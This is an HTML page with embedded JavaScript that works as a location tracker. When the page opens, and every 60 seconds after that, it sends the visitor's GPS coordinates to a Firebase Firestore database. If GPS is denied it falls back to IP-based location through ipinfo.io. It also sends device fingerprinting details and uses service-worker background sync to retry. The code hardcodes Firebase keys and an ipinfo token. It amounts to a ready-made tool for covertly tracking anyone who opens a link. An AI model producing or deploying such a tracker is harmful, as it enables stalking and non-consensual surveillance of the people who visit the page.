<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Background Location Tracker</title>
</head>
<body>
    <h2>Tracking Location in Background...</h2>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // ✅ Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
            authDomain: "locationsaver-b9997.firebaseapp.com",
            projectId: "locationsaver-b9997",
            storageBucket: "locationsaver-b9997.firebaseapp.com",
            messagingSenderId: "675975845355",
            appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
            measurementId: "G-WJJY3Q2M8E"
        };

        // ✅ Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // ✅ Register Service Worker (Ensuring Proper Registration)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js')
                .then(() => console.log("✅ Service Worker Registered"))
                .catch(err => console.error("❌ SW Registration Failed:", err));
        }

        // ✅ Function to Get IST Timestamp
        function getISTTime() {
            let now = new Date();
            let utcTime = now.getTime() + now.getTimezoneOffset() * 60000; // Convert to UTC
            let istTime = new Date(utcTime + (5.5 * 60 * 60 * 1000)); // Convert to IST
            return istTime.toISOString().replace("T", " ").substring(0, 19);
        }

        // ✅ Get Device Info
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                onlineStatus: navigator.onLine,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                pageURL: window.location.href
            };
        }

        // ✅ Function to Get GPS Location
        function getGPSLocation(callback) {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        callback({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: getISTTime(),
                            type: "GPS",
                            device: getDeviceInfo()
                        });
                    },
                    (error) => {
                        console.warn("❌ GPS Denied, Using IP Location Instead.");
                        callback(null);
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                console.warn("❌ GPS Not Supported.");
                callback(null);
            }
        }

        // ✅ Function to Get IP Location
        function getIPLocation(callback) {
            fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
                .then(response => response.json())
                .then(data => {
                    callback({
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        latitude: data.loc.split(",")[0],
                        longitude: data.loc.split(",")[1],
                        org: data.org,
                        postal: data.postal,
                        timezone: data.timezone,
                        timestamp: getISTTime(),
                        type: "IP",
                        device: getDeviceInfo()
                    });
                })
                .catch(error => {
                    console.error("❌ Error Fetching IP Location:", error);
                    callback(null);
                });
        }

        // ✅ Save Data to Firestore
        async function saveToFirestore(data) {
            try {
                await addDoc(collection(db, "user_data"), data);
                console.log("✅ Location Data Sent:", data);
            } catch (error) {
                console.error("❌ Error Saving Data:", error);
                navigator.serviceWorker.ready.then(reg => {
                    reg.sync.register('sync-location'); // Register Background Sync
                });
            }
        }

        // ✅ Function to Collect and Send Location
        function collectLocation() {
            getGPSLocation((gpsData) => {
                if (gpsData) {
                    saveToFirestore(gpsData);
                } else {
                    getIPLocation((ipData) => {
                        if (ipData) saveToFirestore(ipData);
                    });
                }
            });
        }

        // ✅ Send Data Every 60 Seconds
        setInterval(collectLocation, 60000);

        // ✅ Send Cached Data When Online
        window.addEventListener("online", () => {
            navigator.serviceWorker.ready.then(reg => {
                reg.sync.register('sync-location');
            });
        });

        // ✅ Send Location When Page is Opened
        collectLocation();
    </script>
</body>
</html>
